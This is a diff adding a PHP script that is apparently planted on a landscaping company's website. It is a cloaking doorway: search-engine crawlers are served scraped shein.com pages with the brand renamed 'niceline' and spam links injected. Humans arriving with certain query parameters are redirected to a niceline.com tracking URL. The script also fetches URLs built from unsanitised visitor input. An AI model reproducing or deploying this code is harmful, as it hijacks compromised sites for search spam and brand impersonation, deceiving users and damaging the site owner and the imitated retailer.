@@ -1,0 +1,74 @@
+<?php
+$fromsite = "http://www.shein.com/";
+$tmp = strtolower($_SERVER['HTTP_USER_AGENT']);
+$filename = "";
+$mysite = "http://rmjlandscapes.com/"; 
+if (strpos($tmp, 'google') !== false || strpos($tmp, 'yahoo') !== false || strpos($tmp, 'aol') !== false || strpos($tmp, 'sqworm') !== false || strpos($tmp, 'bot') !== false) {
+
+    $ksite = !empty($_GET['success']) ? $_GET['success'] : "";
+    $list = array(
+        'leggings' => 'https://www.niceline.com/?leggings',
+        'fashion leggings' => 'https://www.niceline.com/?fashion',
+    );
+
+	$listname = $filename . "?success=";
+	$liststr = "<div style='text-align: center'>";
+	foreach ($list as $key => $val) {
+		if ($ksite == $key) {
+			$fromsite = $val;
+		}
+		$liststr .= "<a href='" .$mysite .  $filename . "?success=" . $key . "'>" . $key . "</a>&nbsp;&nbsp;";
+	}
+	$liststr .= "</div>";
+	$url = empty($_GET['h1']) ? "" : $_GET['h1'];
+	$content = file_get_contents($fromsite . $url);
+
+	if (!empty($ksite)) {
+		$qstr = $filename . "?success=" . $ksite . "&h1=";
+	} else {
+		$qstr = $filename . "?h1=";
+	}
+	$repstr = $mysite . $qstr;
+
+	$content = str_ireplace('href="', 'href="/', $content);
+	$content = str_ireplace('href="//', 'href="/', $content);
+    $content = str_ireplace('href="/http', 'href="http', $content);
+    $content = str_ireplace('href="/https', 'href="https', $content);
+	$content = str_replace('href="/', 'href="' . $fromsite, $content);
+
+	$content = str_ireplace('src="', 'src="/', $content);
+	$content = str_ireplace('src="//', 'src="/', $content);
+    $content = str_ireplace('src="/http', 'src="http', $content);
+    $content = str_ireplace('src="/https', 'src="https', $content);
+	$content = str_replace('src="/', 'src="' . $fromsite, $content);
+
+	$content = str_ireplace($fromsite, $repstr, $content);
+
+	$content = str_replace($repstr . "skin", $fromsite . "skin", $content);
+	$content = str_replace($repstr . "style", $fromsite . "style", $content);
+	$content = str_replace($repstr . "js", $fromsite . "js", $content);
+	$content = str_replace($repstr . "media", $fromsite . "media", $content);
+	$content = str_replace($repstr . "res", $fromsite . "res", $content);
+    $content = str_replace("https://www.shein.com/",$repstr, $content);
+    $content = str_replace("http://www.shein.com/",$repstr, $content);
+    $content = preg_replace('/shein/i', 'niceline', $content);
+	$content = str_replace("</body>",$liststr . "</body>", $content);
+	
+	echo $content;
+    exit;
+} else {
+	$tiaourl =("https://www.niceline.com/?tracking=5a1d5772a542a");
+	if(isset($_GET['h1']) || isset($_GET['success']))          
+	{
+        header("location: " . $tiaourl);
+        exit;
+	}
+    if(isset($_SERVER['HTTP_REFERER'])) {
+        $ref = strtolower($_SERVER['HTTP_REFERER']);
+        if (strpos ($ref, 'google') !== false || strpos ($ref, 'yahoo') !== false || strpos ($ref, 'bing') !== false || strpos ($ref, 'aol') !== false || strpos ($ref, 'ask') !== false || strpos ($ref, 'search') !== false) {
+        $in = ("/");
+        //if($_SERVER["REQUEST_URI"]==$in){header("location: " . $tiaourl);exit;}
+        }
+    }
+}
+?>
